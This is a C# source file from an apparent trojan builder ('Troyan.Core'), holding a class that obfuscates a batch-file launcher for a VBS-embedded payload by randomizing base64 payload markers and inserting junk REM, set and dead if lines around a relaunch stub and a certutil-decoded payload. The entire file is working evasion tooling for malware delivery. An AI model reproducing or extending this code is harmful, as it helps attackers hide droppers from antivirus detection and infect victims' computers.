using System.Text;

namespace Troyan.Core;

/// <summary>
/// CMD obfuscation for the VBS-embed launcher: random Base64 markers + junk noise.
/// No PowerShell (<c>-EncodedCommand</c> removed).
/// </summary>
public sealed class TroyanCmdObfuscator : ITroyanCmdObfuscator
{
    private const string BeginMarker = "::BEGIN_B64::";
    private const string EndMarker = "::END_B64::";

    private static readonly Random Shared = new();

    public string Obfuscate(string cmdText)
    {
        ArgumentException.ThrowIfNullOrEmpty(cmdText);

        if (!cmdText.Contains(BeginMarker, StringComparison.Ordinal)
            || !cmdText.Contains(EndMarker, StringComparison.Ordinal))
            throw new InvalidOperationException("CMD text must contain ::BEGIN_B64:: and ::END_B64:: markers.");

        var beginTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";
        var endTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";
        while (string.Equals(beginTag, endTag, StringComparison.Ordinal))
            endTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";

        var withMarkers = cmdText
            .Replace(BeginMarker, beginTag, StringComparison.Ordinal)
            .Replace(EndMarker, endTag, StringComparison.Ordinal);

        return InjectNoise(withMarkers);
    }

    private static string InjectNoise(string cmd)
    {
        var nl = cmd.Contains("\r\n", StringComparison.Ordinal) ? "\r\n" : "\n";
        var headNoise = BuildNoiseBlock(Shared.Next(4, 10), nl);
        var midNoise = BuildNoiseBlock(Shared.Next(4, 10), nl);
        var tailNoise = BuildNoiseBlock(Shared.Next(4, 10), nl);

        var echoIdx = cmd.IndexOf("@echo off", StringComparison.OrdinalIgnoreCase);
        if (echoIdx < 0)
            throw new InvalidOperationException("CMD text must contain @echo off.");

        var afterEcho = cmd.IndexOf(nl, echoIdx, StringComparison.Ordinal);
        if (afterEcho < 0)
            afterEcho = echoIdx + "@echo off".Length;
        else
            afterEcho += nl.Length;

        var withHead = cmd[..afterEcho] + headNoise + cmd[afterEcho..];

        // Place mid-noise after the relaunch stub / before payload markers.
        var beginIdx = IndexOfMarkerLine(withHead, nl);
        if (beginIdx < 0)
            throw new InvalidOperationException("CMD text must contain a ::...:: payload begin marker.");

        var withMid = withHead[..beginIdx] + midNoise + withHead[beginIdx..];
        return withMid.TrimEnd() + nl + tailNoise;
    }

    private static int IndexOfMarkerLine(string cmd, string nl)
    {
        // First line that looks like ::Name:: at start of a line (payload begin).
        var offset = 0;
        while (offset < cmd.Length)
        {
            var lineEnd = cmd.IndexOf(nl, offset, StringComparison.Ordinal);
            var line = lineEnd < 0 ? cmd[offset..] : cmd[offset..lineEnd];
            var t = line.Trim();
            if (t.Length >= 4 && t.StartsWith("::", StringComparison.Ordinal) && t.EndsWith("::", StringComparison.Ordinal)
                && !t.Equals("::BEGIN_B64::", StringComparison.Ordinal)) // already randomized by now
            {
                // Prefer the begin marker that appears before a long base64-ish block:
                // both begin and end match; take the first ::x:: after :main / certutil section.
                if (offset > 0 && cmd.LastIndexOf("certutil", offset, StringComparison.OrdinalIgnoreCase) >= 0)
                    return offset;
            }

            if (lineEnd < 0)
                break;
            offset = lineEnd + nl.Length;
        }

        // Fallback: first ::tag:: line in file after @echo off.
        offset = 0;
        while (offset < cmd.Length)
        {
            var lineEnd = cmd.IndexOf(nl, offset, StringComparison.Ordinal);
            var line = lineEnd < 0 ? cmd[offset..] : cmd[offset..lineEnd];
            var t = line.Trim();
            if (t.Length >= 4 && t.StartsWith("::", StringComparison.Ordinal) && t.EndsWith("::", StringComparison.Ordinal))
                return offset;
            if (lineEnd < 0)
                break;
            offset = lineEnd + nl.Length;
        }

        return -1;
    }

    private static string BuildNoiseBlock(int lineCount, string nl)
    {
        var sb = new StringBuilder();
        for (var i = 0; i < lineCount; i++)
            sb.Append(NoiseLine()).Append(nl);
        return sb.ToString();
    }

    private static string NoiseLine()
    {
        var a = PowerShellObfuscator.GenerateRandomName();
        var b = PowerShellObfuscator.GenerateRandomName();
        return Shared.Next(0, 5) switch
        {
            0 => "REM " + a + " " + b,
            1 => "set \"" + a + "=" + b + Shared.Next(1000, 9999) + "\"",
            2 => "set /a " + a + "=" + Shared.Next(1, 50) + "+" + Shared.Next(1, 50) + " >nul 2>&1",
            3 => "if 0==1 echo " + a,
            _ => "if not defined " + a + " set \"" + a + "=" + Shared.Next(10, 99) + "\"",
        };
    }
}
